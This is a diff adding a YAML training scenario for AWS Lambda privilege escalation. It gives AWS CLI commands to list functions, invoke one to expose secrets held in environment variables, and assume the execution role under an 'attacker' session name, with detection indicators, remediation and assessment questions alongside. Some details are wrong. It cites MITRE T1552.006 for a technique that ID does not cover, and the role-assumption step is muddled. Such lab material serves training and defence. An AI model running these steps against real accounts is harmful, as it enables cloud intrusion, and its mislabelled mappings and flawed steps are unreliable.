@@ -1,0 +1,105 @@
+# Category: Cloud Security - AWS
+name: "AWS Lambda Privilege Escalation via Function Environment Variables"
+id: "cloud-aws-lambda-privesc-001"
+category: "cloud_security"
+subcategory: "aws"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit AWS Lambda functions that have overly permissive IAM roles and
+  expose sensitive environment variables (e.g., secrets, other function
+  names). By invoking the function or modifying its configuration, an
+  attacker can read environment variables and escalate privileges to the
+  Lambda's execution role.
+
+learning_objectives:
+  - Understand AWS Lambda's execution role and environment variables
+  - Enumerate Lambda functions and their IAM roles
+  - Invoke a function to read its environment variables
+  - Use the obtained credentials to access other AWS services
+
+tools:
+  - awscli
+  - Lambda Invoke API
+  - jq
+  - Python (boto3)
+
+prerequisites:
+  - AWS credentials with `lambda:ListFunctions` and `lambda:InvokeFunction`
+  - Target Lambda with environment variables containing secrets
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "List Lambda functions and their roles"
+    commands:
+      - "# List functions"
+      - "aws lambda list-functions --region us-east-1"
+      - "# For each, get its role ARN and env variables"
+      - "aws lambda get-function-configuration --function-name <FUNCTION> --region us-east-1"
+      - "# Look for environment variables that may contain secrets"
+    expected_output: "List of functions with roles and env vars"
+    detection: "CloudTrail events `ListFunctions`, `GetFunctionConfiguration` from unusual source"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Invoke function to get environment variables"
+    commands:
+      - "# Invoke function with no payload to get response"
+      - "aws lambda invoke --function-name <FUNCTION> --payload '{}' out.txt"
+      - "# If function logs env vars, they appear in response"
+      - "# Alternatively, if function has `get-environment-variables` logic"
+    expected_output: "Environment variables (e.g., DB_PASS, API_KEY)"
+    detection: "CloudTrail `InvokeFunction` with no parameters; possibly anomalous"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Assume the Lambda execution role"
+    commands:
+      - "# If credentials are for IAM role, use sts:AssumeRole"
+      - "aws sts assume-role --role-arn <ROLE_ARN> --role-session-name attacker --external-id test"
+      - "# Use returned credentials to access other services (e.g., S3, EC2)"
+    expected_output: "Temporary credentials with Lambda role permissions"
+    detection: "CloudTrail `AssumeRole` from non‑Lambda context; IP mismatch"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1552.006"
+    description: "Cloud Instance Metadata API (and env vars)"
+  - standard: "CIS AWS Foundations"
+    control: "3.4"
+    description: "Ensure Lambda functions have least privilege"
+
+detection:
+  network_indicators:
+    - "Lambda invocations from user agents not typical"
+  log_indicators:
+    - "CloudTrail `GetFunctionConfiguration` multiple times"
+    - "CloudTrail `InvokeFunction` with no data"
+  endpoint_indicators:
+    - "aws lambda invoke commands"
+
+remediation:
+  immediate:
+    - "Remove secrets from environment variables; use Secrets Manager"
+    - "Restrict `lambda:InvokeFunction` to only authorized principals"
+  long_term:
+    - "Use resource‑based policies with conditions (e.g., SourceIP)"
+    - "Implement Secrets Manager with automatic rotation"
+
+variables:
+  function_name: "my-lambda"
+  region: "us-east-1"
+  role_arn: "arn:aws:iam::123456789012:role/lambda-exec-role"
+
+assessment_questions:
+  - "Why are environment variables in Lambda risky?"
+  - "How can AWS Secrets Manager help mitigate this?"
+  - "What IAM condition could restrict who can invoke a Lambda?"
+
+references:
+  - url: "https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html"
+    title: "AWS Lambda Environment Variables"
+  - url: "https://www.elastic.co/blog/aws-lambda-security-best-practices"
+    title: "Lambda Security Best Practices"
